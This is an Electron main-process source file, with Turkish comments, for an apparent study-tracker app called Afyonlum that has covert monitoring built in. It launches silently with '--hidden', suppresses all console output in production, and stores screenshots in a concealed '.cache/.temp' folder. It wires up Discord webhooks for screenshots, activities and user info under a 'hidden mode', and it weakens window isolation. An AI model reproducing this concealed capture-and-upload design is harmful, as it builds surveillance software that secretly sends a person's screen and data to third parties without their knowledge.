  : path.join(__dirname, 'config-manager.cjs');
const configManagerModule = safeRequire(
  configManagerPath,
  isPackagedBuild 
    ? path.join(__dirname, 'config-manager.cjs') 
    : path.join(__dirname, 'protected', 'config-manager.cjs'),
  'config-manager'
);
const { getConfigManager } = configManagerModule || { getConfigManager: () => null };

let mainWindow = null;
let logsWindow = null;
let activitiesWindow = null;
let serverProcess = null;
let parentalMonitoring = null;
let webhookManager = null;
let systemStatusInterval = null;
let monitoringStarted = false;
const PORT = 5000;

// SESSİZ BAŞLATMA: --hidden argümanı ile başlatıldı mı kontrol et
const isHiddenStart = process.argv.includes('--hidden') || process.argv.includes('--autostart');

// PRODUCTION MOD: Tüm console çıktılarını sessiz yap
if (app.isPackaged) {
  console.log = () => {};
  console.warn = () => {};
  console.error = () => {};
}
let serverLogs = [];
let lastClickTime = 0;
const DOUBLE_CLICK_THRESHOLD = 300; // 300ms for double click

// Config Manager kullanarak env değişkenlerini yükle
function loadEnvFile() {
  try {
    const cfgManager = getConfigManager();
    cfgManager.logInfo();
    
    const envVars = cfgManager.getAllAsEnv();
    
    // ✅ DÜZELTME: .env dosyasından Discord webhook'larını yükle
    // ✅ Paketlenmiş uygulamada userData kullan
    const userDataPath = app.getPath('userData');
    const envPaths = [
      path.join(userDataPath, '.env'),           // Packaged: userData içinde
      path.join(__dirname, '..', '.env'),        // Development: proje kökünde
      path.join(process.cwd(), '.env'),          // Fallback: çalışma dizini
    ];
    
    for (const envPath of envPaths) {
      if (fs.existsSync(envPath)) {
        const envContent = fs.readFileSync(envPath, 'utf-8');
        const lines = envContent.split('\n');
        
        for (const line of lines) {
          const trimmed = line.trim();
          if (trimmed && !trimmed.startsWith('#') && trimmed.includes('=')) {
            const [key, ...valueParts] = trimmed.split('=');
            let value = valueParts.join('=').trim();
            
            // ✅ DÜZELTME: Tırnak işaretlerini temizle (hem tek hem çift tırnak)
            if ((value.startsWith('"') && value.endsWith('"')) || 
                (value.startsWith("'") && value.endsWith("'"))) {
              value = value.slice(1, -1);
            }
            
            // Discord webhook'larını ve diğer env var'ları yükle
            const cleanKey = key.trim();
            if (cleanKey && value && !envVars[cleanKey]) {
              envVars[cleanKey] = value;
              // ✅ DEBUG: Email değişkenlerini logla
              if (cleanKey.startsWith('EMAIL_')) {
                console.log(`📧 ${cleanKey} yüklendi (${value.substring(0, 3)}...)`);
              }
            }
          }
        }
        console.log(`✅ ${path.basename(envPath)} dosyası yüklendi`);
      }
    }
    
    // Email yapılandırmasını kontrol et
    if (envVars.EMAIL_USER) {
      console.log('✅ Email yapılandırması bulundu');
    } else {
      console.warn('⚠️  Email yapılandırması eksik! Email özelliklerini kullanmak için ayarları yapılandırın.');
    }
    
    // OpenWeather API kontrolü
    if (!envVars.OPENWEATHER_API_KEY) {
      console.warn('⚠️  OPENWEATHER_API_KEY ayarlanmamış. Hava durumu statik veri gösterecek.');
    }
    
    // Discord webhook kontrolü ve ConfigManager'a kaydetme
    const webhookKeys = [
      'DISCORD_WEBHOOK_SCREENSHOTS',
      'DISCORD_WEBHOOK_SYSTEM_STATUS', 
      'DISCORD_WEBHOOK_ACTIVITIES',
      'DISCORD_WEBHOOK_ALERTS',
      'DISCORD_WEBHOOK_USER_INFO'
    ];
    
    // ConfigManager'a webhook'ları kaydet (eğer yoksa)
    const cfgMgr = getConfigManager();
    webhookKeys.forEach(key => {
      const value = envVars[key];
      if (value && !cfgMgr.get(key)) {
        cfgMgr.set(key, value);
        console.log(`✅ ${key} ConfigManager'a kaydedildi`);
      }
    });
    
    const loadedWebhooks = webhookKeys.filter(key => envVars[key]);
    if (loadedWebhooks.length > 0) {
      // ✅ GİZLİ MOD: Kullanıcıya log gösterme
    } else {
      // ✅ GİZLİ MOD: Kullanıcıya log gösterme
    }
    
    return envVars;
  } catch (err) {
    console.error('❌ Config yüklenirken hata:', err.message);
    return {};
  }
}

// 2 kere açılmayı önle
const gotTheLock = app.requestSingleInstanceLock();

if (!gotTheLock) {
  app.quit();
} else {
  app.on('second-instance', (event, commandLine, workingDirectory) => {
    // İkinci instance açılmaya çalışıldığında mevcut pencereyi göster
    // ✅ SESSİZ MOD: Gizli başlatmada bile pencereyi göster (kullanıcı manuel açtığında)
    if (mainWindow) {
      if (mainWindow.isMinimized()) mainWindow.restore();
      if (!mainWindow.isVisible()) mainWindow.show();
      mainWindow.focus();
    }
  });
}

// Hata önleme: Dizinlerin varlığını kontrol et ve oluştur
function ensureDirectoryExists(dirPath) {
  try {
    if (!fs.existsSync(dirPath)) {
      fs.mkdirSync(dirPath, { recursive: true });
    }
  } catch (err) {
    console.error('Dizin oluşturma hatası:', err);
  }
}

// Hata önleme: Dosya varlığını kontrol et
function ensureFileExists(filePath, defaultContent = '') {
  try {
    if (!fs.existsSync(filePath)) {
      const dir = path.dirname(filePath);
      ensureDirectoryExists(dir);
      fs.writeFileSync(filePath, defaultContent, 'utf-8');
    }
  } catch (err) {
    console.error('Dosya oluşturma hatası:', err);
  }
}

// Hata önleme: Node environment kontrolü
function validateNodeEnvironment() {
  try {
    const nodeVersion = process.version;
    console.log('Node.js sürümü:', nodeVersion);
    
    // Gerekli dizinleri oluştur
    const dataDir = path.join(app.getPath('userData'), 'data');
    ensureDirectoryExists(dataDir);
    
    return true;
  } catch (err) {
    console.error('Node environment hatası:', err);
    return false;
  }
}

// Loading ekranını güncelle
function updateLoadingScreen(step, message) {
  if (mainWindow && !mainWindow.isDestroyed()) {
    try {
      mainWindow.webContents.executeJavaScript(`
        (function() {
          const stepElement = document.getElementById('step-${step}');
          if (stepElement) {
            stepElement.innerHTML = '${message}';
            stepElement.style.opacity = '1';
            
            // Önceki adımları yeşil yap
            for (let i = 1; i < ${step}; i++) {
              const prevStep = document.getElementById('step-' + i);
              if (prevStep) {
                prevStep.style.color = '#10b981';
                if (!prevStep.innerHTML.startsWith('✅')) {
                  prevStep.innerHTML = '✅ ' + prevStep.innerHTML.replace('⏳ ', '');
                }
              }
            }
          }
        })();
      `).catch(err => {
        console.warn('Loading ekranı güncellenemedi:', err.message);
      });
    } catch (err) {
      console.warn('Loading ekranı güncellenemedi:', err.message);
    }
  }
}

// Server'ın hazır olup olmadığını kontrol et
function checkServerReady(maxAttempts = 30) {
  return new Promise((resolve, reject) => {
    const http = require('http');
    let attempts = 0;

    const checkPort = () => {
      attempts++;
      updateLoadingScreen(3, `⏳ Bağlantı kontrol ediliyor... (${attempts}/${maxAttempts})`);
      
      const req = http.get(`http://localhost:${PORT}`, (res) => {
        if (res.statusCode === 200 || res.statusCode === 304) {
          console.log(`Server hazır! (${attempts}. deneme)`);
          updateLoadingScreen(3, '✅ Bağlantı başarılı!');
          resolve(true);
        } else {
          if (attempts < maxAttempts) {
            setTimeout(checkPort, 500);
          } else {
            reject(new Error('Server başlatılamadı - zaman aşımı'));
          }
        }
      });

      req.on('error', () => {
        if (attempts < maxAttempts) {
          setTimeout(checkPort, 500);
        } else {
          reject(new Error('Server başlatılamadı - zaman aşımı'));
        }
      });

      req.end();
    };

    checkPort();
  });
}

function startServer() {
  return new Promise((resolve, reject) => {
    const isPackaged = app.isPackaged;
    
    console.log('========================================');
    console.log('🚀 SERVER BAŞLATMA - DEBUG LOGS');
    console.log('========================================');
    console.log('📦 Packaged Mod:', isPackaged);
    console.log('📂 Resources Path:', process.resourcesPath);
    console.log('📂 User Data Path:', app.getPath('userData'));
    console.log('📂 App Path:', app.getAppPath());
    
    try {
      // Config Manager'dan değişkenleri yükle
      const envVars = loadEnvFile();
      // KRITIK: Config değerlerini process.env'e yükle (server başlamadan önce)
      Object.assign(process.env, envVars);
      // Electron ortamı flag'i ekle (şifre güncelleme için gerekli)
      process.env.ELECTRON_ENV = 'true';
      
      // ✅ KRITIK FIX: Paketlenmiş uygulamada tüm yazılabilir dizinleri ayarla
      // Bu olmadan server modülleri logları yazamaz ve Discord'a gönderemez!
      const userDataPath = app.getPath('userData');
      
      // Data dizini (KRITIK: Tüm kullanıcı verileri burada saklanır)
      const dataDir = path.join(userDataPath, 'data');
      process.env.AFYONLUM_DATA_DIR = dataDir;
      process.env.DATA_DIR = dataDir; // Geriye uyumluluk için
      if (!fs.existsSync(dataDir)) {
        fs.mkdirSync(dataDir, { recursive: true });
      }
      
      // Log dizini
      const logsDir = path.join(userDataPath, 'logs');
      process.env.AFYONLUM_LOG_DIR = logsDir;
      if (!fs.existsSync(logsDir)) {
        fs.mkdirSync(logsDir, { recursive: true });
      }
      
      // Cache dizini
      const cacheDir = path.join(userDataPath, '.cache');
      process.env.AFYONLUM_CACHE_DIR = cacheDir;
      if (!fs.existsSync(cacheDir)) {
        fs.mkdirSync(cacheDir, { recursive: true });
      }
      
      // Keys dizini (lisans anahtarları)
      const keysDir = path.join(userDataPath, 'keys');
      process.env.AFYONLUM_KEYS_DIR = keysDir;
      if (!fs.existsSync(keysDir)) {
        fs.mkdirSync(keysDir, { recursive: true });
      }
      
      // Screenshots dizini - GİZLİ (.cache altında)
      // NOT: Görünür "screenshots" klasörü OLUŞTURULMAZ
      const screenshotsDir = path.join(cacheDir, '.temp');
      process.env.AFYONLUM_SCREENSHOTS_DIR = screenshotsDir;
      // NOT: Bu dizin monitoring.cjs tarafından lazım olduğunda oluşturulur
      
      console.log('📂 Yazılabilir Dizinler Ayarlandı:');
      console.log('   - Data:', dataDir);
      console.log('   - Logs:', logsDir);
      console.log('   - Cache:', cacheDir);
      console.log('   - Keys:', keysDir);
      
      console.log('✅ Config değerleri process.env\'e yüklendi:', Object.keys(envVars).join(', '));
      
      if (isPackaged) {
        updateLoadingScreen(1, '🔍 Server dosyası aranıyor...');
        console.log('\n🔍 PACKAGED MOD - Server dosyası aranıyor...');
        
        // Packaged modda çalışırken server path kontrolü
        // 🔒 Bytecode koruması sonrası server-loader.cjs + server.jsc kullanılır
        // NOT: .cjs uzantısı ZORUNLU! .js dosyası ES Module olarak yorumlanır ve require() çalışmaz
        const possiblePaths = [
          // Bytecode loader (öncelikli - protect-server sonrası bu dosya oluşur)
          // KRITIK: .cjs uzantısı kullanılmalı - ES Module hatası önlenir!
          path.join(process.resourcesPath, 'app.asar.unpacked', 'dist', 'server-loader.cjs'),
          path.join(app.getAppPath(), 'dist', 'server-loader.cjs'),
          path.join(app.getAppPath(), '..', 'app.asar.unpacked', 'dist', 'server-loader.cjs'),
          // Bytecode dosyası (direkt yükleme için)
          path.join(process.resourcesPath, 'app.asar.unpacked', 'dist', 'server.jsc'),
          path.join(app.getAppPath(), 'dist', 'server.jsc'),
          // Fallback: Eğer bytecode koruması yoksa server.cjs (normal build)
          path.join(process.resourcesPath, 'app.asar.unpacked', 'dist', 'server.cjs'),
          path.join(app.getAppPath(), 'dist', 'server.cjs'),
          path.join(app.getAppPath(), '..', 'app.asar.unpacked', 'dist', 'server.cjs'),
          path.join(app.getAppPath(), '..', '..', 'dist', 'server.cjs'),
        ];
        
        console.log('📋 Kontrol edilen yollar:');
        possiblePaths.forEach((p, i) => {
          const exists = fs.existsSync(p);
          console.log(`   ${i + 1}. ${exists ? '✅' : '❌'} ${p}`);
        });
        
        // İlk bulunan yolu kullan
        let finalServerPath = possiblePaths.find(p => fs.existsSync(p));
        
        if (!finalServerPath || !fs.existsSync(finalServerPath)) {
          updateLoadingScreen(1, '❌ Server dosyası bulunamadı!');
          const errorMsg = [
            'Server dosyası bulunamadı!',
            '',
            'Uygulamayı yeniden kurun veya geliştiriciye başvurun.',
            'Build hatası olabilir - server dosyası eksik.',
          ].join('\n');
          
          const error = new Error(errorMsg);
          console.error('❌ SERVER DOSYASI BULUNAMADI!');
          console.error('Kontrol edilen yollar:', possiblePaths);
          serverLogs.push(`[HATA] ${error.message}`);
          reject(error);
          return;
        }
        
        updateLoadingScreen(1, '✅ Server dosyası bulundu!');
        
        console.log(`✅ Server dosyası bulundu: ${finalServerPath}`);
        console.log(`📊 Dosya boyutu: ${(fs.statSync(finalServerPath).size / 1024 / 1024).toFixed(2)} MB`);
        
        // Data dizini için ortam değişkeni ayarla
        const dataDir = path.join(app.getPath('userData'), 'data');
        ensureDirectoryExists(dataDir);
        console.log(`📂 Data dizini: ${dataDir}`);
        
        // ✅ ConfigManager'dan lisansa özel ayarları oku ve spawned process'e geçir
        const configManager = getConfigManager();
        const licenseConfig = {};
        
        try {
          const userFullName = configManager.get('USER_FULLNAME');
          const emailUser = configManager.get('EMAIL_USER');
          const emailPass = configManager.get('EMAIL_PASS');
          const emailFrom = configManager.get('EMAIL_FROM');
          const openweatherApiKey = configManager.get('OPENWEATHER_API_KEY');
          
          if (userFullName) licenseConfig.USER_FULLNAME = userFullName;
          if (emailUser) licenseConfig.EMAIL_USER = emailUser;
          if (emailPass) licenseConfig.EMAIL_PASS = emailPass;
          if (emailFrom) licenseConfig.EMAIL_FROM = emailFrom;
          if (openweatherApiKey) licenseConfig.OPENWEATHER_API_KEY = openweatherApiKey;
          
          if (Object.keys(licenseConfig).length > 0) {
            console.log('✅ ConfigManager\'dan lisansa özel ayarlar yüklendi:', Object.keys(licenseConfig).join(', '));
          }
        } catch (error) {
          console.warn('⚠️  ConfigManager ayarları okunamadı:', error);
        }
        
        updateLoadingScreen(2, '🚀 Server başlatılıyor...');
        console.log('\n🚀 Packaged modda server direkt çalıştırılıyor...');
        console.log(`   Server: ${finalServerPath}`);
        console.log(`   PORT: ${PORT}`);
        console.log(`   NODE_ENV: production`);
        
        // ✅ Packaged modda server'ı direkt import edip çalıştır (child process yerine)
        // Bu daha güvenilir ve hataya daha az eğilimli
        
        // Ortam değişkenlerini ayarla
        Object.assign(process.env, {
          ...envVars,
          ...licenseConfig,
          PORT: PORT.toString(),
          NODE_ENV: 'production',
          ELECTRON_ENV: 'true',
          DATA_DIR: dataDir,
          RESOURCES_PATH: process.resourcesPath
        });
        
        console.log('✅ Ortam değişkenleri ayarlandı');
        updateLoadingScreen(2, '⚙️ Server modülü yükleniyor...');
        
        // ✅ Server dosya türünü belirle (bytecode korumalı mı, normal mi?)
        const distDir = path.dirname(finalServerPath);
        const serverJscPath = path.join(distDir, 'server.jsc');
        const serverLoaderPath = path.join(distDir, 'server-loader.cjs'); // .cjs uzantısı KRITIK!
        const serverCjsPath = path.join(distDir, 'server.cjs');
        
        // Bytecode koruması: server.jsc + server-loader.cjs mevcut
        // NOT: .cjs uzantısı kullanıyoruz, .js ES Module olarak yorumlanır ve çalışmaz!
        const hasBytecodeProtection = fs.existsSync(serverJscPath) && fs.existsSync(serverLoaderPath);
        
        // Hangi dosya yüklenecek belirleme
        let serverToLoad = null;
        
        if (hasBytecodeProtection) {
          // Bytecode koruması varsa server-loader.cjs kullan
          serverToLoad = serverLoaderPath;
          console.log('🔒 V8 Bytecode koruması bulundu - EKSTRA GÜVENLİK AKTIF');
          console.log(`   📎 Loader: ${serverLoaderPath}`);
          console.log(`   🔐 Bytecode: ${serverJscPath}`);
          console.log(`   📊 Bytecode boyutu: ${(fs.statSync(serverJscPath).size / 1024).toFixed(2)} KB`);
          updateLoadingScreen(2, '⚙️ Server modülü yükleniyor (Bytecode korumalı)...');
        } else if (fs.existsSync(serverCjsPath)) {
          // Normal mod: server.cjs kullan
          serverToLoad = serverCjsPath;
          console.log('✅ server.cjs bulundu - CommonJS format');
          console.log(`   📎 Server: ${serverCjsPath}`);
          console.log(`   📊 Dosya boyutu: ${(fs.statSync(serverCjsPath).size / 1024).toFixed(2)} KB`);
          updateLoadingScreen(2, '⚙️ Server modülü yükleniyor (Normal mod)...');
        } else if (fs.existsSync(serverLoaderPath)) {
          // Sadece loader varsa (bytecode olmadan - beklenmeyen durum)
          serverToLoad = serverLoaderPath;
          console.log('✅ server-loader.cjs bulundu');
          console.log(`   📎 Server: ${serverLoaderPath}`);
          console.log(`   📊 Dosya boyutu: ${(fs.statSync(serverLoaderPath).size / 1024).toFixed(2)} KB`);
          updateLoadingScreen(2, '⚙️ Server modülü yükleniyor...');
        } else {
          // Hiçbir server dosyası bulunamadı
          const error = new Error('Server dosyası bulunamadı! (server-loader.cjs, server.cjs veya server.jsc yok)');
          console.error('❌ SERVER DOSYASI BULUNAMADI!');
          reject(error);
          return;
        }
        
        try {
          console.log(`📥 Yükleniyor: ${serverToLoad}`);
          
          let serverLoaded = false;
          let loadError = null;
          let loadedFrom = 'unknown';
          
          try {
            require(serverToLoad);
            serverLoaded = true;
            loadedFrom = serverToLoad.includes('loader') ? 'loader' : (serverToLoad.includes('.jsc') ? 'bytecode' : 'cjs');
          } catch (primaryError) {
            console.warn('⚠️  İlk yükleme başarısız:', primaryError.message);
            loadError = primaryError;
            
            const isBytecodeError = primaryError.message && (
              primaryError.message.includes('cachedDataRejected') ||
              primaryError.message.includes('invalid cached data') ||
              primaryError.message.includes('Invalid or incompatible') ||
              primaryError.message.includes('bytecode') ||
              primaryError.message.includes('Unexpected token') ||
              serverToLoad.includes('.jsc') ||
              serverToLoad.includes('loader')
            );
            
            if (isBytecodeError && fs.existsSync(serverCjsPath) && serverToLoad !== serverCjsPath) {
              console.warn('🔄 Bytecode/loader hatası - server.cjs fallback deneniyor...');
              
              try {
                console.log(`📥 Fallback yükleniyor: ${serverCjsPath}`);
                require(serverCjsPath);
                serverLoaded = true;
                loadedFrom = 'fallback-cjs';
                console.log('✅ Fallback başarılı - server.cjs yüklendi');
              } catch (fallbackError) {
                console.error('❌ Fallback da başarısız:', fallbackError.message);
                loadError = fallbackError;
              }
            }
          }
          
          if (!serverLoaded) {
            throw loadError || new Error('Server yüklenemedi');
          }
          
          console.log(`📊 Server yükleme yöntemi: ${loadedFrom}`);
          
          const protectionStatus = hasBytecodeProtection ? '(BYTECODE KORUMALI - TAM GÜVENLİK)' : '(Normal Mod)';
          console.log(`✅ Server başarıyla yüklendi ve çalıştırıldı ${protectionStatus}`);
          updateLoadingScreen(2, `✅ Server başlatıldı! ${hasBytecodeProtection ? '🔒' : '✓'}`);
          
          serverProcess = {
            pid: process.pid,
            kill: () => {
              console.log('Server durdurma isteği alındı');
              app.quit();
            },
            stdout: { on: () => {} },
            stderr: { on: () => {} },
            on: () => {}
          };
        } catch (err) {
          updateLoadingScreen(2, '❌ Server yüklenemedi!');
          const errorMsg = `Server yüklenemedi: ${err.message}\n\nDetaylar:\n${err.stack || err.toString()}`;
          console.error('❌ REQUIRE HATASI:', err);
          console.error('Stack:', err.stack);
          serverLogs.push(`[REQUIRE HATASI] ${errorMsg}`);
          reject(new Error(errorMsg));
        }
      } else {
        updateLoadingScreen(1, '🔧 Development modu aktif...');
        console.log('\n🔧 DEVELOPMENT MOD - Server durumu kontrol ediliyor...');
        
        // Development modda çalışırken npm kontrolü
        // Development için de data dizini ayarla
        const dataDir = path.join(app.getPath('userData'), 'data');
        ensureDirectoryExists(dataDir);
        
        // Önce portu kontrol et - server zaten çalışıyor mu?
        const http = require('http');
        const checkIfServerRunning = () => {
          return new Promise((checkResolve) => {
            const req = http.get(`http://localhost:${PORT}`, (res) => {
              checkResolve(true); // Server zaten çalışıyor
            });
            
            req.on('error', () => {
              checkResolve(false); // Server çalışmıyor
            });
            
            req.setTimeout(1000, () => {
              req.destroy();
              checkResolve(false);
            });
            
            req.end();
          });
        };
        
        checkIfServerRunning().then((isRunning) => {
          if (isRunning) {
            console.log('✅ Server zaten çalışıyor (port 5000 aktif)');
            console.log('ℹ️  Electron mevcut server\'a bağlanacak');
            updateLoadingScreen(2, '✅ Mevcut server\'a bağlanılıyor...');
            
            // Server zaten çalışıyor, yeni process başlatma
            serverProcess = {
              pid: 'external',
              kill: () => {
                console.log('⚠️  Harici server kapatılamaz - manuel olarak durdurun');
              },
              stdout: { on: () => {} },
              stderr: { on: () => {} },
              on: () => {}
            };
            
            // Server'ın gerçekten hazır olmasını bekle
            console.log('⏳ Server bağlantısı test ediliyor...');
            checkServerReady()
              .then(() => {
                console.log('✅ Server hazır!');
                resolve();
              })
              .catch((err) => {
                console.error('❌ Server hazır olamadı:', err);
                reject(err);
              });
          } else {
            console.log('ℹ️  Port 5000 boş - yeni server başlatılıyor...');
            updateLoadingScreen(2, '🚀 npm run dev başlatılıyor...');
            
            // Windows-only: npm.cmd kullan
            const npmCommand = 'npm.cmd';
            
            // ✅ Proje kök dizinini bul
            const projectRoot = app.isPackaged 
              ? path.dirname(app.getPath('exe'))
              : path.join(__dirname, '..');
            
            console.log('📂 Proje kök dizini:', projectRoot);
            console.log('💻 Platform:', process.platform);
            console.log('🔧 NPM komutu:', npmCommand);
            
            serverProcess = spawn(npmCommand, ['run', 'dev'], {
              cwd: projectRoot,  // ✅ Doğru dizinde çalıştır
              shell: true,
              stdio: 'pipe',
              windowsHide: true, // ✅ SESSİZ MOD: Pencere gösterme
              detached: false,   // ✅ Ana process'e bağlı tut (VSCode uyumluluğu)
              env: { 
                ...process.env,
                ...envVars,  // .env dosyasındaki değişkenleri ekle
                PORT: PORT.toString(), 
                NODE_ENV: 'development',
                DATA_DIR: dataDir,
                FORCE_COLOR: '1'  // ✅ Terminal renkleri koru
              }
            });
            
            console.log('✅ Development server başlatıldı, PID:', serverProcess.pid);
            console.log('📋 Server komutu: npm run dev (CWD:', projectRoot, ')');
            updateLoadingScreen(2, '✅ Development server başlatıldı!');
            
            // ✅ Sadece development modda server loglarını topla
            serverProcess.stdout?.on('data', (data) => {
              const log = data.toString();
              const timestamp = new Date().toLocaleTimeString('tr-TR');
              serverLogs.push(`[${timestamp}] ${log}`);
              if (serverLogs.length > 500) serverLogs.shift(); // Max 500 log (performans için düşürüldü)
              
              // HTTP isteklerini yakala ve activity logger'a ekle
              parseServerLogForActivity(log);
              
              // Logs window açıksa güncelle (throttled)
              if (logsWindow && !logsWindow.isDestroyed()) {
                logsWindow.webContents.send('log-update', serverLogs.join('\n'));
              }
            });

            serverProcess.stderr?.on('data', (data) => {
              const log = data.toString();
              const timestamp = new Date().toLocaleTimeString('tr-TR');
              serverLogs.push(`[${timestamp}] [ERROR] ${log}`);
              if (serverLogs.length > 500) serverLogs.shift();
              
              // Logs window açıksa güncelle (throttled)
              if (logsWindow && !logsWindow.isDestroyed()) {
                logsWindow.webContents.send('log-update', serverLogs.join('\n'));
              }
            });

            serverProcess.on('error', (err) => {
              const errorMsg = `Server başlatma hatası: ${err.message}`;
              console.error(errorMsg);
              serverLogs.push(`[${new Date().toLocaleTimeString('tr-TR')}] [HATA] ${errorMsg}`);
              reject(err);
            });
            
            serverProcess.on('exit', (code, signal) => {
              if (code !== 0 && code !== null) {
                const errorMsg = `Server beklenmedik şekilde kapandı (exit code: ${code})`;
                console.error(errorMsg);
                serverLogs.push(`[${new Date().toLocaleTimeString('tr-TR')}] [HATA] ${errorMsg}`);
                
                // Kullanıcıya yardımcı mesaj göster
                dialog.showErrorBox(
                  'Server Hatası',
                  `Development server beklenmedik şekilde kapandı.\n\n` +
                  `Exit Code: ${code}\n` +
                  `Signal: ${signal || 'yok'}\n\n` +
                  `Olası Çözümler:\n` +
                  `1. Terminal'de "npm run dev" çalıştırıp hata mesajlarını kontrol edin\n` +
                  `2. Port 5000 başka bir uygulama tarafından kullanılıyor olabilir\n` +
                  `3. node_modules klasörünü silip "npm install" yapın\n` +
                  `4. .env dosyanızı kontrol edin`
                );
              }
            });
            
            // Server'ın gerçekten hazır olmasını bekle
            console.log('⏳ Server başlatılıyor, hazır olması bekleniyor...');
            checkServerReady()
              .then(() => {
                console.log('✅ Server hazır!');
                resolve();
              })
              .catch((err) => {
                console.error('❌ Server hazır olamadı:', err);
                
                // Kullanıcıya detaylı hata mesajı göster
                const errorDetails = serverLogs.slice(-10).join('\n');
                dialog.showErrorBox(
                  'Server Başlatma Hatası',
                  `Server başlatılamadı veya hazır duruma geçemedi.\n\n` +
                  `Hata: ${err.message}\n\n` +
                  `Son Loglar:\n${errorDetails}\n\n` +
                  `Çözüm:\n` +
                  `1. Terminal'de "npm run dev" komutunu çalıştırın\n` +
                  `2. Hata mesajlarını kontrol edin\n` +
                  `3. Port 5000'in boş olduğundan emin olun`
                );
                
                reject(err);
              });
          }
        });
        
        // checkIfServerRunning().then() bloğu içinde resolve/reject çağrıları var
        // Bu yüzden burada return yapıyoruz
        return;
      }

      // Server'ın gerçekten hazır olmasını bekle
      console.log('⏳ Server başlatılıyor, hazır olması bekleniyor...');
      checkServerReady()
        .then(() => {
          console.log('✅ Server hazır!');
          resolve();
        })
        .catch((err) => {
          console.error('❌ Server hazır olamadı:', err);
          reject(err);
        });
    } catch (err) {
      console.error('Server başlatma hatası:', err);
      serverLogs.push(`[${new Date().toLocaleTimeString('tr-TR')}] [HATA] ${err.message}`);
      reject(err);
    }
  });
}

// Server loglarından aktiviteleri parse et
function parseServerLogForActivity(log) {
  try {
    // Backend'den gelen [ACTIVITY] tag'lerini yakala (çoklu olabilir)
    // Format: [ACTIVITY] Action | Description
    const lines = log.split('\n');
    
    for (const line of lines) {
      const activityPattern = /\[ACTIVITY\]\s+(.+?)(?:\s+\|\s+(.+))?$/;
      const match = line.match(activityPattern);
      
      if (match) {
        const [, action, description] = match;
        activityLogger.log(action, description || '');
      }
    }
  } catch (error) {
    // Sessizce hatayı yakala
  }
}

function restartServer() {
  if (serverProcess) {
    serverLogs.push(`[${new Date().toLocaleTimeString('tr-TR')}] Server yeniden başlatılıyor...`);
    serverProcess.kill();
    serverProcess = null;
  }
  
  setTimeout(() => {
    startServer().then(() => {
      serverLogs.push(`[${new Date().toLocaleTimeString('tr-TR')}] Server başarıyla yeniden başlatıldı`);
      if (logsWindow && !logsWindow.isDestroyed()) {
        logsWindow.webContents.send('log-update', serverLogs.join('\n'));
      }
    }).catch(err => {
      serverLogs.push(`[${new Date().toLocaleTimeString('tr-TR')}] [HATA] Server yeniden başlatılamadı: ${err.message}`);
    });
  }, 1000);
}

function restartApp() {
  app.relaunch();
  app.quit();
}

// Tüm verileri temizle ve sıfırdan başla
async function clearAllData() {
  try {
    // Boş veri yapısı
    const emptyData = {
      gorevler: [],
      ruhHalleri: [],
      hedefler: [],
      soruGunlukleri: [],
      sinavSonuclari: [],
      sinavKonuNetleri: [],
      calismaSaatleri: []
    };
    
    // 1. userData dizinindeki kayitlar.json'u temizle (packaged mod için)
    const userDataDir = path.join(app.getPath('userData'), 'data');
    const userDataKayitlarPath = path.join(userDataDir, 'kayitlar.json');
    
    if (fs.existsSync(userDataKayitlarPath)) {
      fs.unlinkSync(userDataKayitlarPath);
      console.log('✅ userData/kayitlar.json silindi');
    }
    
    ensureDirectoryExists(userDataDir);
    fs.writeFileSync(userDataKayitlarPath, JSON.stringify(emptyData, null, 2), 'utf-8');
    console.log('✅ userData/kayitlar.json sıfırlandı');
    
    // 2. Proje dizinindeki data/kayitlar.json'u temizle (development mod için)
    const projectDataDir = path.join(process.cwd(), 'data');
    const projectKayitlarPath = path.join(projectDataDir, 'kayitlar.json');
    const projectBackupPath = path.join(projectDataDir, 'kayitlar.json.backup');
    
    if (fs.existsSync(projectKayitlarPath)) {
      fs.unlinkSync(projectKayitlarPath);
      console.log('✅ project/data/kayitlar.json silindi');
    }
    
    if (fs.existsSync(projectBackupPath)) {
      fs.unlinkSync(projectBackupPath);
      console.log('✅ project/data/kayitlar.json.backup silindi');
    }
    
    if (fs.existsSync(projectDataDir)) {
      fs.writeFileSync(projectKayitlarPath, JSON.stringify(emptyData, null, 2), 'utf-8');
      console.log('✅ project/data/kayitlar.json sıfırlandı');
    }
    
    // 3. LocalStorage, SessionStorage, IndexedDB ve tüm cache'leri temizle
    if (mainWindow && !mainWindow.isDestroyed()) {
      try {
        // JavaScript ile tüm storage'ları temizle
        await mainWindow.webContents.executeJavaScript(`
          (async () => {
            // LocalStorage temizle
            localStorage.clear();
            
            // SessionStorage temizle
            sessionStorage.clear();
            
            // IndexedDB temizle
            if (window.indexedDB) {
              const databases = await window.indexedDB.databases();
              for (const db of databases) {
                if (db.name) {
                  window.indexedDB.deleteDatabase(db.name);
                }
              }
            }
            
            // Service Workers'ı temizle
            if ('serviceWorker' in navigator) {
              const registrations = await navigator.serviceWorker.getRegistrations();
              for (const registration of registrations) {
                await registration.unregister();
              }
            }
            
            // Cache Storage temizle
            if ('caches' in window) {
              const cacheNames = await caches.keys();
              for (const cacheName of cacheNames) {
                await caches.delete(cacheName);
              }
            }
            
            console.log('✅ Tüm tarayıcı verileri temizlendi');
            return true;
          })();
        `);
        console.log('✅ localStorage, sessionStorage, IndexedDB ve cache temizlendi');
        
        // Electron storage session'ı da temizle
        await mainWindow.webContents.session.clearStorageData({
          storages: ['localstorage', 'websql', 'indexdb', 'serviceworkers', 'cachestorage']
        });
        console.log('✅ Electron session storage temizlendi');
        
        // Cache'leri de temizle
        await mainWindow.webContents.session.clearCache();
        console.log('✅ Electron cache temizlendi');
        
      } catch (err) {
        console.error('❌ Tarayıcı verileri temizleme hatası:', err);
        // Hata olsa bile devam et
      }
    }
    
    console.log('✅✅✅ TÜM VERİLER BAŞARIYLA TEMİZLENDİ VE SIFIRDAN BAŞLATILDI ✅✅✅');
    console.log('📊 Veriler: 0 görev, 0 sınav, 0 soru günlüğü, 0 çalışma saati');
    console.log('💾 LocalStorage, SessionStorage, IndexedDB ve tüm cache\'ler temizlendi');
  } catch (err) {
    console.error('❌ Veri temizleme hatası:', err);
    throw err;
  }
}

function createActivitiesWindow() {
  // Eğer activities window zaten açıksa, focus et
  if (activitiesWindow && !activitiesWindow.isDestroyed()) {
    activitiesWindow.focus();
    return;
  }
  
  activitiesWindow = new BrowserWindow({
    width: 800,
    height: 600,
    title: 'Aktiviteler (Son 7 Gün) - Afyonlum',
    autoHideMenuBar: true,
    backgroundColor: '#1a1a1a',
    icon: path.join(__dirname, 'icons', 'app-icon.ico'),
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
      devTools: false  // DevTools'u engelle
    }
  });
  
  // DevTools'u engelle
